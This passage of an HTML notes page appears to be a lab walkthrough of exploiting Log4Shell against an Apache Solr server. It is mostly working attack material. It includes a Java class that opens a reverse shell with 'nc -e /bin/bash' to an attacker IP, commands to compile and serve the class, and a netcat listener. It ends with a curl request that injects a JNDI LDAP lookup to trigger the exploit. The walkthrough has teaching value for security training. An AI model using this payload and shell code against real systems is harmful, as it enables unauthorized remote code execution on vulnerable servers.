+</p><p id="f608ebe2-c13a-4219-a10d-8fb76a9a09cb" class="">After running this we got our LDAP server</p><p id="a7091b5d-c6f3-4113-bca1-99a27500ed00" class="">
+</p><figure id="84fc6538-4741-4ba6-b8e1-c488e04b3c3c" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%208.png"><img style="width:1225px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%208.png"/></a></figure><p id="1c73d629-f72b-44f4-9b99-e1698b6582b2" class="">
+</p><p id="6416c098-f82a-4b0b-aa49-941def33b096" class="">Now let&#x27;s exploit  using following java code</p><pre id="38cac242-7601-48d6-b29b-5359bd88d9da" class="code"><code>public class Exploit {
+    static {
+        try {
+            java.lang.Runtime.getRuntime().exec(&quot;nc -e /bin/bash 10.9.12.6 9999&quot;);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}</code></pre><p id="35b9b045-f612-45a2-99cf-8587cc1db91f" class="">
+</p><p id="f1e3bc5b-b48d-4ce3-9aa2-c18bd92dfe55" class="">Let&#x27;s compile this exploit java using following command</p><pre id="7f51db71-2f90-4c18-9552-3a83fd6bf63d" class="code"><code>javac exploit.java</code></pre><p id="2eac2c69-9943-4ec2-b1b0-50f7f8bb32b6" class=""> After successful compilation we will get exploit.class file as output</p><figure id="76650d90-63b7-4521-9bf3-bdf1473c7025" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%209.png"><img style="width:580px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%209.png"/></a></figure><p id="f7440ae1-d215-4d95-a585-893e9a7432a3" class="">
+</p><p id="5b419d9c-f26e-4986-87aa-536d3b4b91f0" class="">Now time to setup our HTTP server using python</p><pre id="793389f6-821a-4742-8689-05ab57db414d" class="code"><code>python -m http.server</code></pre><p id="d476edad-2529-464d-bf4a-a75b300e51cf" class="">
+</p><figure id="9ad6db5c-64a3-45e6-abd7-b7cb827126b3" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%2010.png"><img style="width:967px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/Untitled%2010.png"/></a></figure><p id="20e3ed08-144b-47d3-bf07-7e9c894fe870" class="">
+</p><p id="4fae5720-10cd-4f8d-8d8f-c74a90bd9054" class="">Now setting up the netcat listener for reverse shell</p><p id="48d7ca64-b654-4d74-9695-0e7a892cdf2a" class="">
+</p><pre id="b3babba1-254c-41f3-b707-21a15b1043e2" class="code"><code>nc -lvnp 9999</code></pre><p id="1d4f8243-f32a-4326-9244-17437710099c" class="">
+</p><p id="0412a42b-a77b-4d40-a9d7-4582b0f62d2f" class="">use the port which was in java code as that is our exploit </p><p id="4f2b56cf-2b1e-418c-8709-7eb13ba26065" class="">
+</p><p id="5fdc3f63-b2d7-4d37-a552-05567ac340b7" class="">now  time to run our exploit against the server , using jndi syntax and reffering to our local LDAP server this command will establish a reverse shell </p><p id="60ec26e3-d5fb-488f-b42e-8f724384d1a3" class="">
+</p><pre id="1dc53400-b7a6-4f20-8056-acd049c06391" class="code"><code>curl &#x27;http://10.10.149.47:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.12.6:1389/Exploit\}&#x27;</code></pre><p id="6acac706-faed-44ca-a20e-59c8f6d43237" class="">After running this we got following results and connection</p><p id="d2c62a15-88e4-40e4-8d20-27bb7e865191" class="">
+</p><figure id="e7753682-f75a-4f4d-a631-9519a8c42207" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/tp0.png"><img style="width:1112px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/tp0.png"/></a></figure><figure id="e0dfe6a3-266f-4782-8eba-5a27ce18e2e0" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/tmp.png"><img style="width:1242px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/tmp.png"/></a></figure><p id="df56a88a-0d49-41ab-a349-6e5ab5200233" class="">
+</p><figure id="1a61dd1f-dfba-4694-b593-ed0d99dc7dbf" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/tp2.png"><img style="width:830px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/tp2.png"/></a></figure><p id="adf63630-0f0c-4ee6-bae1-07eab74f5dc2" class="">
+</p><figure id="521471fb-8ca7-4fdd-94d7-69ab0a692e95" class="image"><a href="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/tp3.png"><img style="width:698px" src="Log4j%203f2ee80ecba14d2fafe65f5c9908a5e5/tp3.png"/></a></figure><p id="2631a8b7-b3bf-48bb-8c56-281086263c26" class="">
+</p><a href="index.html"><p id="64bfe215-743f-4702-9baf-55304ba3a3a5" class="">&lt;&lt; Back to home</p></a></div></article></body></html>
